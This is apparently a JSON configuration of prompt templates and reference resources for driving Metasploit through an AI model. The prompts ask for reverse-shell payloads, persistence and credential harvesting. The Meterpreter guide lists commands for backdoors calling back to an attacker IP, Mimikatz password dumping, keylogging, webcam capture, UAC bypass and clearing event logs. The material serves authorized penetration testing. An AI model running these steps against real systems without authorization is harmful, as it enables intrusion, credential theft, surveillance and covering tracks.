{
  "prompts": [
    {
      "title": "Network Reconnaissance",
      "description": "Basic network reconnaissance workflow",
      "content": "I need to perform initial reconnaissance on the target network 192.168.1.0/24. Can you help me:\n\n1. Run a ping sweep to identify live hosts\n2. Perform a port scan on the discovered hosts\n3. Identify services running on open ports\n4. Check for any vulnerable services\n5. Present the findings in a structured way"
    },
    {
      "title": "Vulnerability Assessment",
      "description": "Windows server vulnerability assessment",
      "content": "I've identified a Windows server at 10.0.0.15 that appears to be running outdated services. Please help me:\n\n1. Search for relevant Windows vulnerabilities in Metasploit\n2. Find exploits related to SMB services and RDP\n3. Check if the target might be vulnerable to EternalBlue (MS17-010)\n4. Identify which exploits have the highest success rates\n5. Recommend the best vulnerability to target first"
    },
    {
      "title": "Exploitation with Meterpreter",
      "description": "Web server exploitation with reverse shell",
      "content": "I have permission to exploit a vulnerable web server at 192.168.2.10. The server is running Apache 2.4.49 with a known vulnerability. Please help me:\n\n1. Generate a reverse shell payload for Linux that connects back to my IP (192.168.2.5)\n2. Set up a listener for the incoming connection\n3. Execute the exploit and establish a Meterpreter session\n4. Perform basic post-exploitation steps to gather system information\n5. Establish persistence for later access"
    },
    {
      "title": "Password and Credential Harvesting",
      "description": "Harvest credentials from a compromised Windows system",
      "content": "I've established a Meterpreter session on a compromised Windows 10 workstation. Help me harvest credentials by:\n\n1. Dumping stored passwords from memory\n2. Extracting password hashes from the SAM database\n3. Finding stored credentials in common applications\n4. Identifying domain controller information\n5. Suggesting methods to pivot to other systems using the harvested credentials"
    },
    {
      "title": "Reporting and Documentation",
      "description": "Generate a comprehensive penetration test report",
      "content": "I've completed a penetration test on the target network 10.10.0.0/24. Help me generate a comprehensive report by:\n\n1. Summarizing the discovered hosts and their services\n2. Listing the vulnerabilities found, categorized by severity\n3. Documenting the successful exploitation paths\n4. Creating a table of recommended mitigations\n5. Providing evidence of access for each compromised system"
    }
  ],
  "resources": [
    {
      "title": "Metasploit Cheatsheet",
      "description": "Quick reference guide for common Metasploit commands and usage",
      "content": "# Metasploit Cheatsheet\n\n## Basic Commands\n\n- `help`: Display help menu\n- `search [term]`: Search for modules\n- `use [module]`: Select a module to use\n- `info`: Display information about the selected module\n- `show options`: Show required options for the selected module\n- `set [option] [value]`: Set an option for the selected module\n- `run` or `exploit`: Run the selected module\n\n## Database Commands\n\n- `db_status`: Check database connection status\n- `workspace`: List available workspaces\n- `workspace [name]`: Switch to a different workspace\n- `workspace -a [name]`: Add a new workspace\n- `workspace -d [name]`: Delete a workspace\n- `hosts`: List all discovered hosts\n- `services`: List all discovered services\n- `vulns`: List all discovered vulnerabilities\n\n## Scanning Commands\n\n- `db_nmap [options] [targets]`: Run Nmap and store results in the database\n- `auxiliary/scanner/discovery/arp_sweep`: Discover hosts using ARP\n- `auxiliary/scanner/portscan/tcp`: Scan for open TCP ports\n- `auxiliary/scanner/discovery/udp_sweep`: Scan for open UDP ports\n\n## Exploitation Commands\n\n- `sessions`: List active sessions\n- `sessions -i [id]`: Interact with a specific session\n- `sessions -k [id]`: Kill a specific session\n- `background`: Background the current session\n\n## Meterpreter Commands\n\n- `sysinfo`: Get system information\n- `getuid`: Get current user ID\n- `getsystem`: Attempt to elevate privileges\n- `ps`: List running processes\n- `download [file]`: Download a file from the target\n- `upload [file]`: Upload a file to the target\n- `shell`: Get a system shell\n\n## Payload Generation\n\n- `msfvenom -l payloads`: List available payloads\n- `msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format]`: Generate a payload\n\n## Persistence\n\n- `run persistence -h`: Get help on persistence module\n- `run persistence -A -L [path] -X -i [seconds] -p [port] -r [ip]`: Add a persistent backdoor\n\n## Post-Exploitation\n\n- `run post/windows/gather/hashdump`: Dump password hashes on Windows\n- `run post/linux/gather/hashdump`: Dump password hashes on Linux\n- `run post/windows/gather/enum_applications`: Enumerate installed applications\n- `run post/multi/recon/local_exploit_suggester`: Suggest local exploits\n\n## File System Commands\n\n- `pwd`: Print working directory\n- `ls`: List files\n- `cd [directory]`: Change directory\n- `mkdir [directory]`: Create directory\n- `rm [file]`: Remove file\n\n## Network Commands\n\n- `ipconfig`: Show network configuration\n- `route`: Display routing table\n- `portfwd add -l [local_port] -r [remote_host] -p [remote_port]`: Forward a port\n\n## Pivoting\n\n- `route add [subnet] [netmask] [session_id]`: Add a route through a session\n- `route print`: Display the routing table\n- `use auxiliary/server/socks4a`: Start a SOCKS proxy\n\n## Resource Scripts\n\n- `resource [file.rc]`: Run a resource script\n- `makerc [file.rc]`: Create a resource script from the current console commands\n\n## Remember\n\n- Always verify your target scope before launching attacks\n- Document all findings and actions\n- Follow responsible disclosure procedures\n- Maintain proper security for your Metasploit instance"
    },
    {
      "title": "Meterpreter Post-Exploitation",
      "description": "Guide for post-exploitation activities using Meterpreter",
      "content": "# Meterpreter Post-Exploitation Guide\n\n## Overview\n\nThis guide covers common post-exploitation activities using the Meterpreter payload in Metasploit. After successfully exploiting a target and establishing a Meterpreter session, you can use these techniques to gather information, escalate privileges, and move laterally in the network.\n\n## Basic Information Gathering\n\n### System Information\n\n```\nsysinfo\n```\nDisplays information about the target system including OS, architecture, and computer name.\n\n### User Information\n\n```\ngetuid\n```\nDisplays the user context Meterpreter is running under.\n\n```\ngetpid\n```\nShows the process ID that Meterpreter is running under.\n\n### Network Information\n\n```\nipconfig\n```\nShow network interfaces and their configurations.\n\n```\nroute\n```\nDisplay the routing table.\n\n```\narp\n```\nShow the ARP cache.\n\n### Process List\n\n```\nps\n```\nList running processes on the target system.\n\n## Privilege Escalation\n\n### Windows Systems\n\n```\ngetsystem\n```\nAttempt to elevate privileges to SYSTEM on Windows.\n\n```\nrun post/windows/gather/win_privs\n```\nCheck current privileges.\n\n```\nrun post/windows/escalate/bypassuac\n```\nBypass User Account Control (UAC) on Windows.\n\n### Escalation Suggestion\n\n```\nrun post/multi/recon/local_exploit_suggester\n```\nSuggests local exploits that might work for privilege escalation based on the target system.\n\n## Credential Harvesting\n\n### Windows Password Hashes\n\n```\nrun post/windows/gather/hashdump\n```\nDump local password hashes from the SAM database.\n\n```\nrun post/windows/gather/credentials/credential_collector\n```\nCollect credentials from various Windows sources.\n\n```\nload kiwi\nkiwi_cmd sekurlsa::logonpasswords\n```\nUse Mimikatz (via the kiwi extension) to extract plaintext passwords from memory.\n\n### Linux Credentials\n\n```\nrun post/linux/gather/hashdump\n```\nDump password hashes on Linux systems.\n\n```\nrun post/linux/gather/enum_configs\n```\nGather configuration files that might contain credentials.\n\n## File System Operations\n\n### Navigation\n\n```\npwd\n```\nPrint working directory.\n\n```\nls\n```\nList files in the current directory.\n\n```\ncd <directory>\n```\nChange directory.\n\n### File Transfer\n\n```\ndownload <remote_file> <local_destination>\n```\nDownload a file from the target system.\n\n```\nupload <local_file> <remote_destination>\n```\nUpload a file to the target system.\n\n### File Operations\n\n```\ncat <file>\n```\nDisplay contents of a file.\n\n```\nedit <file>\n```\nEdit a file using the default editor.\n\n```\nsearch -f *.txt\n```\nSearch for text files.\n\n## Persistence\n\n### Windows Persistence\n\n```\nrun persistence -U -i 30 -p 443 -r <attacker_ip>\n```\nAdd a persistent backdoor that connects back every 30 seconds.\n\n```\nrun scheduleme -m 1 -u /tmp/evil.exe\n```\nSchedule a task to run every minute.\n\n### Linux Persistence\n\n```\nrun persistence -U -i 60 -p 443 -r <attacker_ip> -L /tmp/\n```\nEstablish persistence on a Linux target.\n\n## Pivoting\n\n### Adding Routes\n\n```\nrun autoroute -s <target_subnet>\n```\nAdd a route to the target subnet through the current session.\n\n```\nrun autoroute -p\n```\nPrint the current routing table.\n\n### Port Forwarding\n\n```\nportfwd add -l <local_port> -p <remote_port> -r <remote_host>\n```\nForward a local port to a remote port.\n\n### SOCKS Proxy\n\n```\nrun auxiliary/server/socks4a\n```\nStart a SOCKS proxy server to pivot through the compromised host.\n\n## Data Collection\n\n### Screenshots\n\n```\nscreenshot\n```\nTake a screenshot of the target's desktop.\n\n### Keylogging\n\n```\nkeyscan_start\n```\nStart capturing keystrokes.\n\n```\nkeyscan_dump\n```\nDump the captured keystrokes.\n\n```\nkeyscan_stop\n```\nStop capturing keystrokes.\n\n### Webcam\n\n```\nwebcam_list\n```\nList available webcams.\n\n```\nwebcam_snap\n```\nTake a snapshot from the webcam.\n\n## System Manipulation\n\n### Windows Registry\n\n```\nreg enumkey -k HKLM\\Software\n```\nEnumerate registry keys.\n\n```\nreg setval -k HKLM\\Software\\Test -v Value -d Data\n```\nSet a registry value.\n\n### Command Execution\n\n```\nexecute -f cmd.exe -i -H\n```\nExecute a command with a hidden window and interactive.\n\n```\nshell\n```\nSpawn a system shell.\n\n## Cleanup\n\n```\nclearev\n```\nClear event logs on Windows systems.\n\n```\nrun multi_console_command -rc /path/to/cleanup_script\n```\nRun a script to clean up artifacts.\n\n## Network Enumeration\n\n```\nrun post/windows/gather/enum_domain\n```\nEnumerate domain information.\n\n```\nrun arp_scanner -r 192.168.1.0/24\n```\nScan the network for active hosts.\n\n## Advanced Techniques\n\n### Process Migration\n\n```\nrun post/windows/manage/migrate\n```\nMigrate to a more stable process.\n\n```\nmigrate <PID>\n```\nMigrate to a specific process ID.\n\n### Token Impersonation\n\n```\nload incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\User\n```\nImpersonate a user token to gain their privileges.\n\n## Remember\n\n- Always document actions taken during post-exploitation\n- Be mindful of creating excessive network traffic\n- Clean up after completing the assessment\n- Follow responsible disclosure procedures\n"
    }
  ]
}
